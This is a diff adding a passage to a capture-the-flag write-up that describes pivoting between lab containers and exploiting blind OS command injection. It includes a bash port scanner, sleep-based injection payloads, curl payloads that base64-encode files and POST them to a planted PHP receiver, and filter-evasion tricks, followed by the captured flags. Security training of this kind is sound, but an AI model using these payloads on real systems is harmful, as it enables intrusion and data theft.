@@ -815,8 +815,81 @@ I precisely followed the instruction and finally make some progress when I look 
 
 ![[Pasted image 20260302101638.png]]
 
+The table tells me that there are 5 resolved IP addresses that are found to be on the same network as my current container which are `1.3.3.3`, `1.3.3.1`, `1.3.3.7`, `1.3.3.2`, `1.3.3.8`. There is something missing is `1.3.3.6`. Checking `/etc/hosts`, I can be sure that `1.3.3.6` is the internal IP address of my container.
+
+![[Pasted image 20260302123344.png]]
+
+I start investigating the if these IP has any well-known ports open:
+
+```bash
+#!/bin/bash 
+TARGET="1.3.3.7" 
+echo "=== SCANNING $TARGET FOR OPEN PORTS ==="
+for port in 21 22 80 443 3306 6379 8080 9000 $(seq 40000 45000); do 
+		(echo > /dev/tcp/$TARGET/$port) >/dev/null 2>&1 && echo "[+] Port $port is OPEN" done 
+echo "=== SCAN COMPLETE ==="
+```
+
+From this test I found that `1.3.3.1` is the default gateway, which is the host machines of these containers as it has **SSH** port 22 open, while other IPs only have port 80 open. Using `curl` to check on the ports and realize all of the them were serving the same "Parrot" page. 
+
+`1.3.3.2`, `1.3.3.3`, `1.3.3.8` served the same page, they echoed back what I input and using the same trick I used with `1.3.3.6`, I can check the root directory, I also know that all three of the pages does not have the 12-characters input restriction so I can immediately leak the flag in the root directory, they are all fake flags. This leads me to a conclusion that `1.3.3.7` is the one that is definitely holding the flag since it is the only page that was behaving differently.
+
+`1.3.3.7` returned "Éc éc" no matter what I input.
+
+```bash
+curl -s -X POST http://1.3.3.7/ -d "word=okokok"
+```
+
+![[Pasted image 20260302130043.png]]
+
+I tried different payload and compare the length the of the returned document, but they were all the same.
+
+I thought maybe this challenge is not about OS command injection anymore but some other type of challenge? Like if there there is a shared folder between `1.3.3.6` and `1.3.3.7` that I haven't found, or maybe it is a **PHP CGI** vulnerability.
+
+Checking the response from `curl`, the PHP version that `1.3.3.7` was the same as `1.3.3.6` which is **8.0.30** so it is highly unlikely that it is vulnerable to PHP CGI.
+
+There is no shared folders between `1.3.3.7` and `1.3.3.6` that I can find. The page is invulnerable to **Path Traversal**.
+
+At this point, my gut tells me that this might be a **Blind OS Command Injection**. I can never get anything else other than "Éc éc" in the first place. There is still a chance that the filtering logic behind `1.3.3.7` is the same as `1.3.3.6` so I reviewed the `index.php` on `1.3.3.6` and see that the `sleep` command is not filtered. So I tried the payload:
+```html
+word=%0Asleep+10
+```
+
+![[Pasted image 20260302131907.png]]
+
+The request timed out this means that the command was definitely executed, since I tried with other command the response came back almost immediately so this is definitely not a connection problem.
+
+I tried if there is a 12-character filter
+
+```html
+word=%0Asleep+59999999
+```
+
+It still timed out, meaning the command definitely work. I tried this payload on `1.3.3.6` and it was not timed out but return `Dài quá, khum nói` immediately.
+
+I immediately fire a payload that will leak me the root directory of the container:
+
+```bash
+curl -s -X POST -d 'word=%0Acurl -X POST -d "$(l\s -la / | base64 -w 0)" http://1.3.3.6/images/recv.php' http://1.3.3.7/
+```
+
+This command make 1.3.3.7 to leak the flag and post it to the `recv.php` file that I've injected beforehand in `1.3.3.6`
+
+```php
+<?php file_put_contents("dir.txt", file_get_contents("php://input")); ?>
+```
+
+By checking the exposed `dir.txt` file and decode the base64 string, I see the root directory:
+
+![[Pasted image 20260302133846.png]]
+
+With another payload I can read the flag:
+
+```bash
+curl -s -X POST -d 'word=%0Acurl -X POST -d "$(ca\\t /flagljChD | base64 -w 0)" http://1.3.3.6/images/recv.php' http://1.3.3.7/
+```
+
 ## Loot & Flags
+**Flag 1:** BKSEC{h4v3_y0u_1nj3ct3d_y0urs3lf_c8f2a9b36e2239}
 
----
-
-**References:** [Link](https://www.google.com/search?q=url)
+**Flag 2:** BKSEC{good_job_boy_heheeheeeeeeeeee_6f6e6c7966616e73}
